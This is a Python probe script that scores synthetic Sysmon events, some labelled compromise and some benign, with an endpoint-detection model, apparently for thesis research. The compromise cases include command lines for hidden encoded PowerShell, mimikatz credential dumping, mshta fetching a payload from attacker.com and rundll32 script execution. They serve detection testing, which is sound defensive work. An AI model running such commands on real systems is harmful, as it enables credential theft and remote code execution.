"""Probe the Sysmon-balanced model with realistic mixed attack + benign events."""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from model_loader import FrozenModel
from feature_row import build_feature_row

MODEL = Path("J:/THESIS-EDR/server/ml-engine/botsv2/models/lgbm_xt_stratified_vanilla_sysmon_balanced")
m = FrozenModel(MODEL)
print(f"threshold = {m.threshold:.3f}\n")


def sysmon(host, eid, kvs):
    parts = [f"<Event><System><EventID>{eid}</EventID><Computer>{host}</Computer></System><EventData>"]
    for k, v in kvs.items():
        parts.append(f"<Data Name='{k}'>{v}</Data>")
    parts.append("</EventData></Event>")
    return "".join(parts)


def mk(host, eid, kvs, edge="WRITE", obj="FILE"):
    return {
        "raw_event": sysmon(host, eid, kvs),
        "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
        "edge_type": edge,
        "subject": {"node_type": "PROCESS"},
        "object": {"node_type": obj},
        "endpoint_id": host,
        "properties": {},
    }


cases = [
    # === COMPROMISES on hosts the model has never seen ===
    ("COMPROMISE: powershell -nop -w hidden -enc (novel host)",
     mk("alice-pc", 1, {
         "ProcessId": "8821", "ParentProcessId": "100",
         "ParentImage": r"C:\Windows\explorer.exe",
         "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4ALgBkAA==",
         "User": r"CORP\alice"}, edge="FORK", obj="PROCESS")),
    ("COMPROMISE: mimikatz sekurlsa::logonpasswords (novel)",
     mk("alice-pc", 1, {
         "ProcessId": "8822", "ParentProcessId": "100",
         "Image": r"C:\Tools\mimikatz.exe",
         "CommandLine": 'mimikatz.exe "sekurlsa::logonpasswords" exit',
         "User": r"CORP\alice"}, edge="FORK", obj="PROCESS")),
    ("COMPROMISE: mshta attacker payload (novel)",
     mk("alice-pc", 1, {
         "ProcessId": "8823",
         "Image": r"C:\Windows\System32\mshta.exe",
         "CommandLine": "mshta.exe http://attacker.com/payload.hta",
         "User": r"CORP\alice"}, edge="FORK", obj="PROCESS")),
    ("COMPROMISE: rundll32 + JS (novel)",
     mk("alice-pc", 1, {
         "ProcessId": "8826",
         "Image": r"C:\Windows\System32\rundll32.exe",
         "CommandLine": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication "+document.write();new%20ActiveXObject("WScript.Shell")',
         "User": r"CORP\alice"}, edge="FORK", obj="PROCESS")),
    ("COMPROMISE: .crypt ransomware write (novel)",
     mk("finance-pc", 11, {
         "ProcessId": "8824",
         "Image": r"C:\Users\acct\Downloads\bad.exe",
         "CommandLine": "bad.exe",
         "TargetFilename": r"C:\Users\acct\Q3.xlsx.crypt"}, edge="WRITE")),
    ("COMPROMISE: winsys32.dll drop (novel)",
     mk("corp-laptop", 11, {
         "ProcessId": "8825",
         "Image": r"C:\Users\jdoe\Temp\invoice.zip.exe",
         "CommandLine": "invoice.zip.exe",
         "TargetFilename": r"C:\Windows\System32\winsys32.dll"}, edge="WRITE")),

    # === BENIGN events on the same hosts ===
    ("BENIGN:     Word saves .docx",
     mk("alice-pc", 11, {
         "ProcessId": "5000",
         "Image": r"C:\Program Files\Microsoft Office\WINWORD.EXE",
         "CommandLine": "WINWORD.EXE",
         "TargetFilename": r"C:\Users\alice\Documents\notes.docx"}, edge="WRITE")),
    ("BENIGN:     notepad saves .txt",
     mk("alice-pc", 11, {
         "ProcessId": "5001",
         "Image": r"C:\Windows\System32\notepad.exe",
         "CommandLine": "notepad.exe",
         "TargetFilename": r"C:\Users\alice\Documents\todo.txt"}, edge="WRITE")),
    ("BENIGN:     SearchFilterHost startup",
     mk("alice-pc", 1, {
         "ProcessId": "5003",
         "Image": r"C:\Windows\System32\SearchFilterHost.exe",
         "CommandLine": "SearchFilterHost.exe 0 512 516 524 65536 520",
         "User": r"NT AUTHORITY\SYSTEM"}, edge="FORK", obj="PROCESS")),
    ("BENIGN:     cmd.exe dir (admin)",
     mk("alice-pc", 1, {
         "ProcessId": "5002",
         "Image": r"C:\Windows\System32\cmd.exe",
         "CommandLine": "cmd.exe /c dir",
         "User": r"CORP\alice"}, edge="FORK", obj="PROCESS")),
    ("BENIGN:     chrome.exe child",
     mk("alice-pc", 1, {
         "ProcessId": "5004",
         "Image": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
         "CommandLine": "chrome.exe --type=renderer",
         "User": r"CORP\alice"}, edge="FORK", obj="PROCESS")),
    ("BENIGN:     svchost service start",
     mk("alice-pc", 1, {
         "ProcessId": "5005",
         "Image": r"C:\Windows\System32\svchost.exe",
         "CommandLine": "svchost.exe -k NetworkService -p -s Dnscache",
         "User": r"NT AUTHORITY\SYSTEM"}, edge="FORK", obj="PROCESS")),
]

print(f"{'case':<58} {'score':>8} {'verdict':>8}")
print("-" * 78)
for label, ev in cases:
    row, _ = build_feature_row(ev)
    s = m.predict_proba(row)
    v = "ALERT" if s >= m.threshold else "benign"
    print(f"{label:<58} {s:>8.4f} {v:>8}")
